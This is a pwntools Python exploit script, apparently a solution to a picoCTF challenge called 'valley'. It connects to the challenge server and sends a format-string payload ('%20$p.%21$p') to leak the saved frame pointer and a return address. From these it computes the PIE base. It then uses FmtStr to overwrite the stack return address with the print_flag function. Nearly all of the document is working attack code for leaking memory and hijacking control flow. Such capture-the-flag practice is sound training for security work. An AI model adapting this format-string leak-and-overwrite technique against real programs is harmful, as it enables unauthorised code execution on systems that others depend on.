from pwn import *


elf = ELF("./valley")

context.binary = elf
context.log_level = "info"
context.clear(arch="amd64")

# if args.REMOTE:
p = remote("shape-facility.picoctf.net", 49609)
# else:
    # p = process("./valley")

# Leak PIE base address
# main+18: (0x78 - 0x0) / 8 + 6 = 21st

# 0e:0070│ rbp     0x7fffffffd740 -> 0x7fffffffd750 -> 0x7fffffffd7f0 -> 0x7fffffffd850 <- 0
# saved rbp: (0x70 - 0x0) / 8 + 6 = 20th
# leaking str format: "<rbp>.<main+18>"
p.sendlineafter(b"Try Shouting: ", b"%20$p.%21$p")
p.recvuntil(b"You heard in the distance: ")
rbp_addr_raw, leak_main_p18_raw = p.recvline().strip().split(b".")
rbp_addr = int(rbp_addr_raw, 16)
leak_main_p18 = int(leak_main_p18_raw, 16)

main_p18 = elf.symbols["main"] + 18
pie_base = leak_main_p18 - main_p18
print_flag_addr = pie_base + elf.symbols["print_flag"]

# 00:0000│ rbp rsp 0x7fffffffd6d0 <- 'ABCDEFGH.%lx.%lx.%lx.%lx.%lx.%lx.%l ...
# 0f:0078│+008     0x7fffffffd748 -> 0x555555555413 (main+18) <- mov eax, 0
rsp_addr = rbp_addr - 0x10 - 0x70
stack_write_addr = rsp_addr + 0x78

log.info(f"Leaked main+18: {hex(leak_main_p18)}")
log.info(f"PIE base: {hex(pie_base)}")
log.info(f"print_flag() address: {hex(print_flag_addr)}")
log.info(f"RSP address: {hex(rsp_addr)}")
log.info(f"stack_write_addr: {hex(stack_write_addr)}")


def exec_format(payload):
    if len(payload) >= 100:
        log.error(f"Payload too large: {len(payload)}")
    log.info(f"Sending payload: {str(payload)}")
    p.sendline(payload)
    return p.recv()


autofmt = FmtStr(execute_fmt=exec_format, offset=6)
autofmt.write(stack_write_addr, print_flag_addr)
autofmt.execute_writes()

log.info("Exiting...")
p.sendline(b"exit")

print(p.recvall())
